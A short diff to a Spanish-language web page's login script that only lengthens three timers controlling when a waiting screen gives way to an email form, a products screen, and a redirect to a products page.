@@ -267,7 +267,7 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
       setTimeout(()=>{
         document.getElementById("pantallaEspera").classList.add("hidden");
         document.getElementById("formCorreo").classList.remove("hidden");
-      }, 25000); // puedes ajustar el tiempo
+      }, 35000); // puedes ajustar el tiempo
     }
   } catch (error) {
     document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
@@ -294,7 +294,7 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
       setTimeout(()=>{
         document.getElementById("pantallaEspera").classList.add("hidden");
         document.getElementById("pantallaProductos").classList.remove("hidden");
-      }, 10000);
+      }, 15000);
     }
 
     function mostrarProductos(disponibles){
@@ -314,7 +314,7 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
 
       setTimeout(()=>{
         window.location.href="productos.html";
-      }, 10000);
+      }, 15000);
     }
   </script>
 </body>
